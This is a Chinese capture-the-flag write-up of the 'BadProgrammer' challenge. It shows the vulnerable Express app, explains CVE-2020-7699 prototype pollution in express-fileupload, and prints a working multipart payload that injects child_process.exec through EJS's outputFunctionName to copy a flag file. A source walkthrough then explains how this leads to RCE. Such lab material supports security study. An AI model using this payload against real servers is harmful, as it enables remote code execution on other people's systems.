# 原型链污染

## 攻防世界BadProgrammer

路由扫描出app.js

```js
const express = require('express');
const fileUpload = require('express-fileupload');
const app = express();

app.use(fileUpload({ parseNested: true }));

app.post('/4_pATh_y0u_CaNN07_Gu3ss', (req, res) => {
    res.render('flag.ejs');
});

app.get('/', (req, res) => {
    res.render('index.ejs');
})

app.listen(3000);
app.on('listening', function() {
    console.log('Express server started on port %s at %s', server.address().port, server.address().address);
});
```

查看package.json文件，发现引用express-fileupload版本为1.1.7-alpha.4，此版本存在CVE-2020-7699，原型链污染漏洞。

> 从利用角度说就是`app.use(fileUpload({ parseNested: true }))`开启的情况下,可以通过文件上传，污染一些值,
> 这道题中可以污染的是outputFunctionName, 进而获取shell

payload:
```html
Content-Length: 236
Content-Type: multipart/form-data; boundary=f9ad5c42ff3d78f5b5d3aa7539dc1354

--f9ad5c42ff3d78f5b5d3aa7539dc1354
Content-Disposition: form-data; name="__proto__.outputFunctionName"





x;process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x

--f9ad5c42ff3d78f5b5d3aa7539dc1354--
```

## ==源码分析==---关键部分

```js
if (opts.outputFunctionName) {
        prepended += '  var ' + opts.outputFunctionName + ' = __append;' + '\n';
}
```
源码在拼接js代码
如果将`x;process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x`注入会发生什么: 

`pretend += 'var x;process.mainModule.require('child_process').exec('cp /flag.txt /app/static/js/flag.txt');x=__append'`
源码中outputFunctionName是空的,**也就是我们在没有改变源码功能的情况下加了一段代码**, 而且源码中最后所有代码都会执行, 从而达到==RCE==
